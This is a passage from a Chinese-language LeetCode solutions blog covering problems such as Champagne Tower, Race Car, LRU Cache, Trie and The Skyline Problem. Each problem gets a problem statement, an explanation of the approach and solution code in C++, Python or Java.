(dp[j - 1] + 1) if A[i - 1] == B[j - 1] else 0 ans = max(ans, dp[j]) return ans 799. Champagne Tower We stack glasses in a pyramid, where the first row has 1 glass, the second row has 2 glasses, and so on until the 100th row. Each glass holds one cup (250ml) of champagne. Then, some champagne is poured in the first glass at the top. When the top most glass is full, any excess liquid poured will fall equally to the glass immediately to the left and right of it. When those glasses become full, any excess champagne will fall equally to the left and right of those glasses, and so on. (A glass at the bottom row has it's excess champagne fall on the floor.) For example, after one cup of champagne is poured, the top most glass is full. After two cups of champagne are poured, the two glasses on the second row are half full. After three cups of champagne are poured, those two cups become full - there are 3 full glasses total now. After four cups of champagne are poured, the third row has the middle glass half full, and the two outside glasses are a quarter full, as pictured below. Now after pouring some non-negative integer cups of champagne, return how full the j-th glass in the i-th row is (both i and j are 0 indexed.) Example 1: Input: poured = 1, query_glass = 1, query_row = 1 Output: 0.0 Explanation: We poured 1 cup of champange to the top glass of the tower (which is indexed as (0, 0)). There will be no excess liquid so all the glasses under the top glass will remain empty. Example 2: Input: poured = 2, query_glass = 1, query_row = 1 Output: 0.5 Explanation: We poured 2 cups of champange to the top glass of the tower (which is indexed as (0, 0)). There is one cup of excess liquid. The glass indexed as (1, 0) and the glass indexed as (1, 1) will share the excess liquid equally, and each will get half cup of champange. Note: poured will be in the range of [0, 10 ^ 9]. query_glass and query_row will be in the range of [0, 99]. 题目地址：leetcode Champagne Tower 题目大意：第0排1个杯子，第1排2个杯子以此类推。当某个杯子装满水，溢出的水均匀的向下一排的两边扩散。给定n杯水，问第i行第j个杯子的满水情况。 思路：直接dp 若dp[i][j] &gt; 1 dp[i + 1][j] += dp[i][j] dp[i + 1][j + 1] += dp[i][j] 就是说当前的i,j可以流向下一行的第j个和第j+1个 C++ 123456789101112131415class Solution &#123;public: double champagneTower(int poured, int query_row, int query_glass) &#123; vector&lt;vector&lt;double&gt;&gt; dp(query_row + 1, vector&lt;double&gt;(query_row + 1, 0)); dp[0][0] = poured; for (int i = 0; i &lt; query_row; ++i) &#123; for (int j = 0; j &lt;= i; ++j) &#123; double cur = dp[i][j] &gt; 1 ? (dp[i][j] - 1.0) / 2 : 0; dp[i + 1][j] += cur; dp[i + 1][j + 1] += cur; &#125; &#125; return min(dp[query_row][query_glass], 1.0); &#125;&#125;; Python 12345678910111213141516class Solution(object): def champagneTower(self, poured, query_row, query_glass): &quot;&quot;&quot; :type poured: int :type query_row: int :type query_glass: int :rtype: float &quot;&quot;&quot; dp = [[0] * (i + 1) for i in range(query_row + 1)] dp[0][0] = poured for i in range(query_row): for j in range(i + 1): cur = (dp[i][j] - 1) / 2.0 if dp[i][j] &gt; 1 else 0 dp[i + 1][j] += cur dp[i + 1][j + 1] += cur return min(dp[query_row][query_glass], 1) 另一种写法： Python 1234567891011121314class Solution(object): def champagneTower(self, poured, query_row, query_glass): &quot;&quot;&quot; :type poured: int :type query_row: int :type query_glass: int :rtype: float &quot;&quot;&quot; dp = [[0 for _ in range(query_row + 1)] for i in range(query_row + 1)] dp[0][0] = poured for i in range(1, query_row + 1): for j in range(i + 1): dp[i][j] += (max(dp[i - 1][j - 1] - 1, 0) / 2.0) + (max(dp[i - 1][j] - 1, 0) / 2.0) return min(dp[query_row][query_glass], 1) 818. Race Car Your car starts at position 0 and speed +1 on an infinite number line. (Your car can go into negative positions.) Your car drives automatically according to a sequence of instructions A (accelerate) and R (reverse). When you get an instruction \"A\", your car does the following: position += speed, speed *= 2. When you get an instruction \"R\", your car does the following: if your speed is positive then speed = -1 , otherwise speed = 1. (Your position stays the same.) For example, after commands \"AAR\", your car goes to positions 0-&gt;1-&gt;3-&gt;3, and your speed goes to 1-&gt;2-&gt;4-&gt;-1. Now for some target position, say the length of the shortest sequence of instructions to get there. Example 1: Input: target = 3 Output: 2 Explanation: The shortest instruction sequence is \"AA\". Your position goes from 0-&gt;1-&gt;3. Example 2: Input: target = 6 Output: 5 Explanation: The shortest instruction sequence is \"AAARA\". Your position goes from 0-&gt;1-&gt;3-&gt;7-&gt;7-&gt;6. Note: 1 &lt;= target &lt;= 10000. 题目地址：leetcode Race Car 题目大意：你可以做两种操作'A'和‘R', A即position += speed, speed *= 2. R即让你速度反向，并且大小为1. 问你用这两种操作到达target的最小步数。 思路： DP,设dp[i]为到达i的最小步数。 则对于i = 2^k - 1，走k步即可（没有更优的了） 对于2^(k-1) &lt; i &lt; 2^k 先走到2^(k-1) - 1处(A^(k-1))，然后掉头，然后走A^x, 然后掉头，走dp[i - (2^(k -1) - 1)+ 2^(x) - 1]，所以总共为k-1 + 1 + x + 1 + dp[i - (2^(k -1) - 1)+ 2^(x) - 1] 走到2^k - 1，然后掉头，走dp[2^k -1 - i] 总共 k + 1+ dp[2^k - 1- target] C++ 123456789101112131415161718192021222324252627282930class Solution &#123; int numer_bit(int target) &#123; int cnt = 0; while (target &gt; 0) &#123; ++cnt; target &gt;&gt;= 1; &#125; return cnt; &#125;public: int racecar(int target) &#123; vector&lt;int&gt; dp((target &lt;&lt; 1) + 1, INT_MAX &gt;&gt; 1); dp[0] = 0; for (int i = 1; i &lt;= target; ++i) &#123; int k = numer_bit(i); if ((i &amp; (i + 1)) == 0) dp[i] = k; else &#123; for (int x = 0; x &lt; k; ++x) &#123; int p = i - ((1 &lt;&lt; (k - 1)) - 1) + (1 &lt;&lt; x) - 1; if (p &lt; 0) break; dp[i] = min(dp[i], k + x + 1 + dp[p]); &#125; dp[i] = min(dp[i], k + 1 + dp[(1 &lt;&lt; k) - 1 - i]); &#125; &#125; return dp[target]; &#125;&#125;; Python 123456789101112131415161718192021222324class Solution(object): def DP(self, target, dp): if dp[target] != -1: return dp[target] k = target.bit_length() if target == 2 ** k - 1: dp[target] = k else: ans = 0x7fffffff for t in range(k - 1): remain = target - ((1 &lt;&lt; (k - 1)) - 1) + ((1 &lt;&lt; t) - 1) if remain &lt; 0: break ans = min(ans, self.DP(remain, dp) + k + t + 1) ans = min(ans, self.DP(((1 &lt;&lt; k) - 1) - target, dp) + k + 1) # A^K R DP[2^k-1 - target] dp[target] = ans return dp[target] def racecar(self, target): &quot;&quot;&quot; :type target: int :rtype: int &quot;&quot;&quot; if target &lt; 1: return 0 dp = [0] + [-1] * (target &lt;&lt; 1) return self.DP(target, dp) 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"leetcode 数据结构","slug":"leetcode-datastructure","date":"2015-03-08T02:07:38.000Z","updated":"2021-03-06T15:14:24.425Z","comments":true,"path":"leetcode-datastructure/","link":"","permalink":"https://www.hrwhisper.me/leetcode-datastructure/","excerpt":"本次题解包括 20. Valid Parentheses 146 LRU Cache 150 Evaluate Reverse Polish Notation 155 Min Stack 187 Repeated DNA Sequences 208 Implement Trie (Prefix Tree) 211 Add and Search Word - Data structure design 218 The Skyline Problem 232 Implement Queue using Stacks 239 Sliding Window Maximum 341 Flatten Nested List Iterator 352 Data Stream as Disjoint Intervals 432 All O'one Data Structure 下一个更大元素 II","text":"本次题解包括 20. Valid Parentheses 146 LRU Cache 150 Evaluate Reverse Polish Notation 155 Min Stack 187 Repeated DNA Sequences 208 Implement Trie (Prefix Tree) 211 Add and Search Word - Data structure design 218 The Skyline Problem 232 Implement Queue using Stacks 239 Sliding Window Maximum 341 Flatten Nested List Iterator 352 Data Stream as Disjoint Intervals 432 All O'one Data Structure 下一个更大元素 II 20. Valid Parentheses Given a string containing just the characters '(', ')', '&#123;', '&#125;', '[' and ']', determine if the input string is valid. The brackets must close in the correct order, \"()\" and \"()[]&#123;&#125;\" are all valid but \"(]\" and \"([)]\" are not. 题目地址：leetcode Valid Parentheses 题目大意 给定三种括号组成的字符串，让你判断是否合法 思路 用栈判断即可。 C++ 123456789101112131415161718class Solution &#123;public: bool isValid(string s) &#123; stack&lt;char&gt; q; for (char c : s) &#123; if (c == &#x27;[&#x27; || c == &#x27;&#123;&#x27; || c == &#x27;(&#x27;) q.push(c); else &#123; if (q.empty()) return false; char top = q.top(); q.pop(); if (c == &#x27;)&#x27; &amp;&amp; top != &#x27;(&#x27; || c == &#x27;&#125;&#x27; &amp;&amp; top != &#x27;&#123;&#x27; || c == &#x27;]&#x27; &amp;&amp; top != &#x27;[&#x27;) return false; &#125; &#125; return q.empty(); &#125;&#125;; Python 12345678910111213141516class Solution(object): def isValid(self, s): &quot;&quot;&quot; :type s: str :rtype: bool &quot;&quot;&quot; q = [] for c in s: if c in [&#x27;(&#x27;,&#x27;&#123;&#x27;,&#x27;[&#x27;]: q.append(c) else: if not q: return False top = q.pop() if c == &#x27;)&#x27; and top != &#x27;(&#x27; or c == &#x27;&#125;&#x27; and top != &#x27;&#123;&#x27; or c == &#x27;]&#x27; and top != &#x27;[&#x27;: return False return not q 146. LRU Cache Design and implement a data structure for Least Recently Used (LRU) cache. It should support the following operations: get and set. get(key) - Get the value (will always be positive) of the key if the key exists in the cache, otherwise return -1. set(key, value) - Set or insert the value if the key is not already present. When the cache reached its capacity, it should invalidate the least recently used item before inserting a new item. 传送门 题意：设计一个数据结构，要求实现LRU（Least Recently Used 即最近最不常使用）功能 get(key)： 获取Key对应的值，如果不存在返回-1 set(key, value) ： 设置key的值为value，超过容量，那么应先删除最近最不常使用的元素，再插入 思路： LRU是在OS课上有讲过。当我们访问过一个元素，设置一个元素的时候，都应该标记一下刚使用过。 我是用字典+链表实现的。要点如下 构造函数中创建一个list q和一个字典dic get时候，如果元素存在，将q中对应的key删除，并将其插入队尾 set时候，如果元素不存在且容量过大，删除队首元素，将新的插入队尾和字典。如果元素存在，只需要设置字典，和将q中对应的调到队尾即可。（先删除后插入） C++ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778struct DoubleListNode &#123; DoubleListNode *pre; DoubleListNode *next; int key; int val; DoubleListNode(int k, int v) : key(k), val(v), pre(nullptr), next(nullptr) &#123;&#125;&#125;;class DoubleLinkList &#123; DoubleListNode *head; DoubleListNode *tail;public: DoubleLinkList()&#123; head = new DoubleListNode(-1, -1); tail = new DoubleListNode(-1, -1); head-&gt;next = tail; tail-&gt;pre = head; &#125; DoubleListNode* removeHead() &#123; return remove(head-&gt;next); &#125; DoubleListNode* remove(DoubleListNode *t) &#123; if (t == head || t == tail) return nullptr; DoubleListNode *pre = t-&gt;pre; DoubleListNode *next = t-&gt;next; pre-&gt;next = next; next-&gt;pre = pre; return t; &#125; void insertTail(DoubleListNode *t) &#123; DoubleListNode *pre = tail-&gt;pre; t-&gt;pre = pre; t-&gt;next = tail; pre-&gt;next = t; tail-&gt;pre = t; &#125;&#125;;class LRUCache &#123; int capacity; unordered_map&lt;int, DoubleListNode*&gt; hashmap; DoubleLinkList list;public: LRUCache(int capacity) : capacity(capacity) &#123;&#125; int get(int key) &#123; if (hashmap.find(key) == hashmap.end()) return -1; DoubleListNode *t = hashmap[key]; list.remove(t); list.insertTail(t); return t-&gt;val; &#125; void put(int key, int value) &#123; if (hashmap.find(key) != hashmap.end()) &#123; DoubleListNode *t = hashmap[key]; list.remove(t); list.insertTail(t); t-&gt;val = value; &#125; else &#123; if (hashmap.size() &gt;= capacity) &#123; DoubleListNode *t = list.removeHead(); hashmap.erase(t-&gt;key); delete t; &#125; DoubleListNode *t = new DoubleListNode(key, value); hashmap[key] = t; list.insertTail(t); &#125; &#125;&#125;; Python 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374class Node(object): def __init__(self, key, value): self.key = key self.value = value self.next = None self.pre = Noneclass DoubleLinkList(object): def __init__(self): self.head = None self.tail = None def pop(self, node=None): if not node: node = self.tail pre, next = node.pre, node.next if pre and next: pre.next = next next.pre = pre if node == self.tail: self.tail = self.tail.pre if node == self.head: self.head = self.head.next return node def insert_head(self, node): if not self.head: self.head = self.tail = node else: node.next = self.head node.pre = self.tail self.head.pre = node self.tail.next = node self.head = nodeclass LRUCache(object): def __init__(self, capacity): &quot;&quot;&quot; :type capacity: int &quot;&quot;&quot; self.capacity = capacity self.map = &#123;&#125; self.linklist = DoubleLinkList() def get(self, key): &quot;&quot;&quot; :type key: int :rtype: int &quot;&quot;&quot; node = self.map.get(key) if not node: return -1 self.linklist.pop(node) self.linklist.insert_head(node) return node.value def put(self, key, value): &quot;&quot;&quot; :type key: int :type value: int :rtype: void &quot;&quot;&quot; if key in self.map: node = self.linklist.pop(self.map[key]) node.value = value else: if len(self.map) == self.capacity: node = self.linklist.pop() del self.map[node.key] node = Node(key, value) self.map[key] = node self.linklist.insert_head(node) Java 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879class LinkedListNode &#123; int key; int value; LinkedListNode pre; LinkedListNode next; LinkedListNode(int key, int value) &#123; this.key = key; this.value = value; &#125;&#125;class DoubleLinkedList &#123; LinkedListNode head = null; LinkedListNode tail = null; LinkedListNode removeTail() &#123; return remove(tail); &#125; LinkedListNode remove(final LinkedListNode node) &#123; LinkedListNode pre = node.pre, next = node.next; if (pre != null) pre.next = next; if (next != null) next.pre = pre; if (node == head) head = head.next; if (node == tail) tail = tail.pre; return node; &#125; void insertHead(LinkedListNode node) &#123; if (head == null) head = tail = node; else &#123; node.next = head; node.pre = tail; head.pre = node; tail.next = node; head = node; &#125; &#125;&#125;public class LRUCache &#123; int capacity; DoubleLinkedList list; HashMap&lt;Integer, LinkedListNode&gt; map = new HashMap&lt;&gt;(); public LRUCache(int capacity) &#123; this.capacity = capacity; this.list = new DoubleLinkedList(); &#125; public int get(int key) &#123; LinkedListNode node = map.get(key); if (node == null) return -1; list.insertHead(list.remove(node)); return node.value; &#125; public void put(int key, int value) &#123; LinkedListNode node = map.get(key); if (node != null) &#123; node.value = value; list.insertHead(list.remove(node)); &#125; else &#123; if(map.size() == capacity)&#123; node = list.removeTail(); map.remove(node.key); &#125; node = new LinkedListNode(key,value); map.put(key,node); list.insertHead(node); &#125; &#125;&#125; 150. Evaluate Reverse Polish Notation Evaluate the value of an arithmetic expression in Reverse Polish Notation. Valid operators are +, -, *, /. Each operand may be an integer or another expression. Some examples: 12[&quot;2&quot;, &quot;1&quot;, &quot;+&quot;, &quot;3&quot;, &quot;*&quot;] -&gt; ((2 + 1) * 3) -&gt; 9[&quot;4&quot;, &quot;13&quot;, &quot;5&quot;, &quot;&#x2F;&quot;, &quot;+&quot;] -&gt; (4 + (13 &#x2F; 5)) -&gt; 6 传送门 题意：给定一个字符串数组（后缀表达式）求其计算结果 思路：遇到四则运算符时候，从栈中取出两个元素进行计算。然后入栈。 我巧妙的运用了异常处理，代码更简洁、更优雅。 还有就是Python负数除法需要注意。 12345678910111213141516171819class Solution: # @param tokens, a list of string # @return an integer def evalRPN(self, tokens): stack = [] for i in tokens: try: temp = int(i) stack.append(temp) except Exception, e: b,a=stack[-1],stack[-2] stack.pop() stack.pop() if i == &#x27;+&#x27;: a = a+b elif i==&#x27;-&#x27;: a = a-b elif i==&#x27;*&#x27;: a = a*b elif i==&#x27;/&#x27;: a = int(a*1.0/b) stack.append(a) return stack[-1] 155. Min Stack Design a stack that supports push, pop, top, and retrieving the minimum element in constant time. push(x) -- Push element x onto stack. pop() -- Removes the element on top of the stack. top() -- Get the top element. getMin() -- Retrieve the minimum element in the stack. 传送门 题意：设计一个数据结构，要求实现如下功能 push(x) -- 把x入栈 pop() -- 删除栈顶 top() -- 获取top元素 getMin() -- 返回栈中最小元素 思路：双栈，用另一个栈来维护到当前位置最小的值。 12345678910111213141516171819202122232425262728293031323334class MinStack(object): def __init__(self): &quot;&quot;&quot; initialize your data structure here. &quot;&quot;&quot; self.stack = [] self.min = [] def push(self, x): &quot;&quot;&quot; :type x: int :rtype: void &quot;&quot;&quot; self.stack.append(x) if not self.min or x &lt;= self.min[-1]: self.min.append(x) def pop(self): &quot;&quot;&quot; :rtype: void &quot;&quot;&quot; x = self.stack.pop() if x == self.min[-1]: self.min.pop() def top(self): &quot;&quot;&quot; :rtype: int &quot;&quot;&quot; return self.stack[-1] def getMin(self): &quot;&quot;&quot; :rtype: int &quot;&quot;&quot; return self.min[-1] C++ 123456789101112131415161718192021222324252627282930class MinStack &#123; std::stack&lt;int&gt; s; std::stack&lt;int&gt; min_s;public: /** initialize your data structure here. */ MinStack() &#123;&#125; void push(int x) &#123; s.push(x); if (min_s.empty() || min_s.top() &gt;= x) &#123; min_s.push(x); &#125; &#125; void pop() &#123; int x = s.top(); s.pop(); if (x == min_s.top()) &#123; min_s.pop(); &#125; &#125; int top() &#123; return s.top(); &#125; int min() &#123; return min_s.top(); &#125;&#125;; 187. Repeated DNA Sequences All DNA is composed of a series of nucleotides abbreviated as A, C, G, and T, for example: \"ACGAATTCCG\". When studying DNA, it is sometimes useful to identify repeated sequences within the DNA. Write a function to find all the 10-letter-long sequences (substrings) that occur more than once in a DNA molecule. For example, 123456Given s &#x3D; &quot;AAAAACCCCCAAAAACCCCCCAAAAAGGGTTT&quot;,Return:[&quot;AAAAACCCCC&quot;, &quot;CCCCCAAAAA&quot;]. 传送门 题意：给定一个DNA字符串，返回不只出现过一次的10个字符长的子串 思路：枚举所有10字符的子串，直接用哈希表即可 1234567891011class Solution: # @param s, a string # @return a list of strings def findRepeatedDnaSequences(self, s): dic ,ans, n=set(),set(),len(s) for i in xrange(n-9): cur = s[i:i+10] if cur in dic: ans.add(cur) else: dic.add(cur) return list(ans) 208. Implement Trie (Prefix Tree) Implement a trie with insert, search, and startsWith methods. Note: You may assume that all inputs are consist of lowercase letters a-z. 传送门 题意：要求实现前缀树。 思路：直接写呗。。。 我是用结点上的end判断是否有以这个字母作为结束的单词。因为相同单词路径唯一。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273class TrieNode &#123;public: static const int c_size = 26; bool end; TrieNode *child[26]; // Initialize your data structure here. TrieNode() &#123; end = false; for (int i = 0; i &lt; c_size; i++) child[i] = NULL; &#125;&#125;;class Trie &#123;public: Trie() &#123; root = new TrieNode(); &#125; inline int index(const char &amp;c)&#123; return c - &#x27;a&#x27;; &#125; // Inserts a word into the trie. void insert(string word) &#123; TrieNode *p = root; for (int i = 0; i &lt; word.length(); i++)&#123; int id = index(word[i]); if (!p-&gt;child[id])&#123; TrieNode *t = new TrieNode(); p-&gt;child[id] = t; &#125; p = p-&gt;child[id]; &#125; p-&gt;end = true; &#125; // Returns if the word is in the trie. bool search(string word) &#123; TrieNode *p = match_word(word); return p &amp;&amp; p-&gt;end; &#125; // Returns if there is any word in the trie // that starts with the given prefix. bool startsWith(string prefix) &#123; return match_word(prefix); &#125; ~Trie() &#123; deleteNode(root); &#125; void deleteNode(TrieNode *root)&#123; if (!root) return; for (int i = 0; i &lt; TrieNode::c_size; i++)&#123; deleteNode(root-&gt;child[i]); &#125; delete root; &#125;private: TrieNode* root; TrieNode* match_word(const string &amp;word)&#123; TrieNode *p = root; for (int i = 0; i &lt; word.length(); i++)&#123; int id = index(word[i]); if (!p-&gt;child[id]) return NULL; p = p-&gt;child[id]; &#125; return p; &#125;&#125;; 211. Add and Search Word - Data structure design Design a data structure that supports the following two operations: 123void addWord(word)bool search(word) search(word) can search a literal word or a regular expression string containing only letters a-z or .. A . means it can represent any one letter. For example: 1234567addWord(&quot;bad&quot;)addWord(&quot;dad&quot;)addWord(&quot;mad&quot;)search(&quot;pad&quot;) -&gt; falsesearch(&quot;bad&quot;) -&gt; truesearch(&quot;.ad&quot;) -&gt; truesearch(&quot;b..&quot;) -&gt; true Note: You may assume that all words are consist of lowercase letters a-z. 传送门 题意：和上一题一样，实现个数据结构，有插入和查找功能。查找的时候'.'可以代替任意字符。 思路：就是search的时候需要注意.的情况需要遍历当前层所有的点 C++ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576class TrieNode &#123;public: static const int c_size = 26; bool end; TrieNode *child[26]; // Initialize your data structure here. TrieNode() &#123; end = false; for (int i = 0; i &lt; c_size; i++) child[i] = NULL; &#125;&#125;;class WordDictionary &#123;public: WordDictionary() &#123; root = new TrieNode(); &#125; inline int index(const char &amp;c)&#123; return c - &#x27;a&#x27;; &#125; // Adds a word into the data structure. void addWord(string word) &#123; TrieNode *p = root; for (int i = 0; i &lt; word.length(); i++)&#123; int id = index(word[i]); if (!p-&gt;child[id])&#123; TrieNode *t = new TrieNode(); p-&gt;child[id] = t; &#125; p = p-&gt;child[id]; &#125; p-&gt;end = true; &#125; // Returns if the word is in the data structure. A word could // contain the dot character &#x27;.&#x27; to represent any one letter. bool search(string word) &#123; return match_word(root,0,word); &#125; ~WordDictionary() &#123; deleteNode(root); &#125; void deleteNode(TrieNode *root)&#123; if (!root) return; for (int i = 0; i &lt; TrieNode::c_size; i++)&#123; deleteNode(root-&gt;child[i]); &#125; delete root; &#125;private: TrieNode* root; bool match_word(TrieNode *p ,int k,const string &amp;word)&#123; if (!p || k &gt; word.length()) return false; if (k == word.length() &amp;&amp; p-&gt;end) return true; for (; k &lt; word.length(); k++)&#123; if (word[k] == &#x27;.&#x27;) &#123; for (int j = 0; j &lt; TrieNode::c_size; j++)&#123; if (match_word(p-&gt;child[j], k + 1, word)) return true; &#125; return false; &#125; else&#123; int id = index(word[k]); if (!p-&gt;child[id]) return false; p = p-&gt;child[id]; &#125; &#125; return p-&gt;end; &#125;&#125;; 212. Word Search II Given a 2D board and a list of words from the dictionary, find all words in the board. Each word must be constructed from letters of sequentially adjacent cell, where \"adjacent\" cells are those horizontally or vertically neighboring. The same letter cell may not be used more than once in a word. For example, Given words = [\"oath\",\"pea\",\"eat\",\"rain\"] and board = 1234567[ [&#39;o&#39;,&#39;a&#39;,&#39;a&#39;,&#39;n&#39;], [&#39;e&#39;,&#39;t&#39;,&#39;a&#39;,&#39;e&#39;], [&#39;i&#39;,&#39;h&#39;,&#39;k&#39;,&#39;r&#39;], [&#39;i&#39;,&#39;f&#39;,&#39;l&#39;,&#39;v&#39;]] Return [\"eat\",\"oath\"]. Note: You may assume that all inputs are consist of lowercase letters a-z. 传送门 题意：给定一个矩阵和一些单词，求能在矩阵中找到的所有单词。（通过上下、左右相邻拼接，但是每个字符只能使用一次） 思路：和79题的DFS方法差不多，就是要求效率更高。所以可以使用前缀树！看看当前路径上前缀树是否有，若没有，则直接剪枝了。 79 Word Search的题解： https://www.hrwhisper.me/?p=523 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091class TrieNode &#123;public: static const int c_size = 26; bool end; TrieNode *child[26]; // Initialize your data structure here. TrieNode() &#123; end = false; for (int i = 0; i &lt; c_size; i++) child[i] = NULL; &#125;&#125;;class Trie &#123; TrieNode* root;public: Trie() &#123; root = new TrieNode(); &#125; inline TrieNode * getRoot()&#123; return root; &#125; inline int index(const char &amp;c)&#123; return c - &#x27;a&#x27;;&#125; // Inserts a word into the trie. void insert(string word) &#123; TrieNode *p = root; for (int i = 0; i &lt; word.length(); i++)&#123; int id = index(word[i]); if (!p-&gt;child[id])&#123; TrieNode *t = new TrieNode(); p-&gt;child[id] = t; &#125; p = p-&gt;child[id]; &#125; p-&gt;end = true; &#125; ~Trie() &#123; deleteNode(root); &#125; void deleteNode(TrieNode *root)&#123; if (!root) return; for (int i = 0; i &lt; TrieNode::c_size; i++)&#123; deleteNode(root-&gt;child[i]); &#125; delete root; &#125;&#125;;const int dx[4] = &#123; 1, -1, 0, 0 &#125;;const int dy[4] = &#123; 0, 0, 1, -1 &#125;;class Solution &#123;public: unordered_set&lt;string&gt; ans; vector&lt;string&gt; findWords(vector&lt;vector&lt;char&gt;&gt;&amp; board, vector&lt;string&gt;&amp; words) &#123; vector&lt;vector&lt;bool&gt; &gt; vis(board.size(), vector&lt;bool&gt;(board[0].size(), 0)); Trie wordTrie; for (int i = 0; i &lt; words.size(); i++) wordTrie.insert(words[i]); for (int i = 0; i &lt; board.size(); i++)&#123; for (int j = 0; j &lt; board[0].size(); j++)&#123; if (wordTrie.getRoot()-&gt;child[board[i][j] - &#x27;a&#x27;])&#123; vis[i][j] = true; string cur; cur.push_back(board[i][j]); dfs(i, j, cur, board, vis, wordTrie.getRoot()-&gt;child[board[i][j] - &#x27;a&#x27;]); vis[i][j] = false; &#125; &#125; &#125; vector&lt;string&gt; res; for (auto it = ans.begin(); it != ans.end(); it++)&#123; res.push_back(*it); &#125; return res; &#125; void dfs(int x, int y, string cur, vector&lt;vector&lt;char&gt; &gt;&amp; board, vector&lt;vector&lt;bool&gt; &gt;&amp;vis, TrieNode* p)&#123; if (p-&gt;end) ans.insert(cur); for (int i = 0; i &lt; 4; i++)&#123; int nx = x + dx[i]; int ny = y + dy[i]; if (ok(nx, ny, board.size(), board[0].size()) &amp;&amp; !vis[nx][ny] &amp;&amp; p-&gt;child[board[nx][ny] - &#x27;a&#x27;])&#123; vis[nx][ny] = true; dfs(nx, ny, cur + board[nx][ny], board, vis, p-&gt;child[board[nx][ny] - &#x27;a&#x27;]); vis[nx][ny] = false; &#125; &#125; &#125; inline bool ok(int nx, int ny, int m, int n)&#123; if (nx &lt; 0 || nx &gt;= m || ny &lt; 0 || ny &gt;= n) return false; return true; &#125;&#125;; 218. The Skyline Problem A city's skyline is the outer contour of the silhouette formed by all the buildings in that city when viewed from a distance. Now suppose you aregiven the locations and height of all the buildings as shown on a cityscape photo (Figure A), write a program to output the skyline formed by these buildings collectively (Figure B). Buildings The geometric information of each building is represented by a triplet of integers [Li, Ri, Hi], where Li and Ri are the x coordinates of the left and right edge of the ith building, respectively, and Hi is its height. It is guaranteed that 0 ≤ Li, Ri ≤ INT_MAX, 0 &lt; Hi ≤ INT_MAX, and Ri - Li &gt; 0. You may assume all buildings are perfect rectangles grounded on an absolutely flat surface at height 0. For instance, the dimensions of all buildings in Figure A are recorded as: [ [2 9 10], [3 7 15], [5 12 12], [15 20 10], [19 24 8] ] . The output is a list of \"key points\" (red dots in Figure B) in the format of [ [x1,y1], [x2, y2], [x3, y3], ... ] that uniquely defines a skyline. A key point is the left endpoint of a horizontal line segment. Note that the last key point, where the rightmost building ends, is merely used to mark the termination of the skyline, and always has zero height. Also, the ground in between any two adjacent buildings should be considered part of the skyline contour. For instance, the skyline in Figure B should be represented as:[ [2 10], [3 15], [7 12], [12 0], [15 10], [20 8], [24, 0] ]. Notes: The number of buildings in any input list is guaranteed to be in the range [0, 10000]. The input list is already sorted in ascending order by the left x position Li. The output list must be sorted by the x position. There must be no consecutive horizontal lines of equal height in the output skyline. For instance, [...[2 3], [4 5], [7 5], [11 5], [12 7]...] is not acceptable; the three lines of height 5 should be merged into one in the final output as such: [...[2 3], [4 5], [12 7], ...] 题目地址：leetcode The Skyline Problem 题意：给定一些[L,R,H]这样的数组，L,R分别表示矩形起始和终点，H表示高度。 让你求这些矩形的外轮廓中的左端点 思路： 我觉得写不出比 https://briangordon.github.io/2014/08/the-skyline-problem.html 更好的分析了。 我简单的说下大概内容。 就是朴素的方法枚举所有可能的点（每个矩形的左边和右边），然后再枚举包括当前点的所有矩形。 当前的轮廓线取最高的那点。复杂度O(n^2) 更进一步的做法是用堆来看当前最高的高度。 此外由于C++的heap不能删除特定的点，因此用个map标记一下。 还有就是一开始预处理的时候，把左边的高度设为负数，这样就区分开了左右端点。 详见代码。 C++ 1234567891011121314151617181920212223242526272829303132333435363738bool cmp(const pair&lt;int, int&gt; &amp;a, const pair&lt;int, int&gt; &amp;b) &#123; return a.first != b.first ? a.first &lt; b.first : a.second &lt; b.second;&#125;class Solution &#123;public: vector&lt;pair&lt;int, int&gt;&gt; getSkyline(vector&lt;vector&lt;int&gt;&gt;&amp; buildings) &#123; vector&lt;pair&lt;int,int&gt;&gt; heigtht; for (int i = 0; i &lt; buildings.size(); i++) &#123; heigtht.push_back(make_pair(buildings[i][0], -buildings[i][2])); heigtht.push_back(make_pair(buildings[i][1], buildings[i][2])); &#125; sort(heigtht.begin(), heigtht.end(), cmp); vector&lt;pair&lt;int, int&gt;&gt; ans; unordered_map&lt;int, int&gt; m; priority_queue&lt;int&gt; q; int pre = 0; q.push(pre); for (int i = 0; i &lt; heigtht.size(); i++) &#123; if (heigtht[i].second &lt; 0) &#123; q.push(-heigtht[i].second); &#125; else &#123; ++m[heigtht[i].second]; while (!q.empty() &amp;&amp; m[q.top()] &gt; 0) &#123; --m[q.top()]; q.pop(); &#125; &#125; int cur = q.top(); if (cur != pre) &#123; pre = cur; ans.push_back(make_pair(heigtht[i].first,cur)); &#125; &#125; return ans; &#125;&#125;; 232. Implement Queue using Stacks Implement the following operations of a queue using stacks. push(x) -- Push element x to the back of queue. pop() -- Removes the element from in front of queue. peek() -- Get the front element. empty() -- Return whether the queue is empty. Notes: You must use only standard operations of a stack -- which means only push to top, peek/pop from top, size, and is empty operations are valid. Depending on your language, stack may not be supported natively. You may simulate a stack by using a list or deque (double-ended queue), as long as you use only standard operations of a stack. You may assume that all operations are valid (for example, no pop or peek operations will be called on an empty queue). 题目地址：leetcode Implement Queue using Stacks 题意：要求你用栈来实现队列。 思路：栈和队列可以说恰好是相反的，栈是后进先出(LIFO)，而队列是先进先出(FIFO)。 所以，这题可以进行push的时候，可以把其中一个栈的元素放到个临时的栈里，然后把新的元素push，接着把放到临时的栈里的数弄回来。比如1234（最右边的为top，这里是4） 放到临时栈为4321，然后原来栈放入5，接着把临时栈的放回来，就是51234 更好的方法是，用两个栈来做，一个负责输入input，一个负责输出output。 push:放入input即可 peek / pop : 若output为空，则把input中的移入output empty: input 和 output 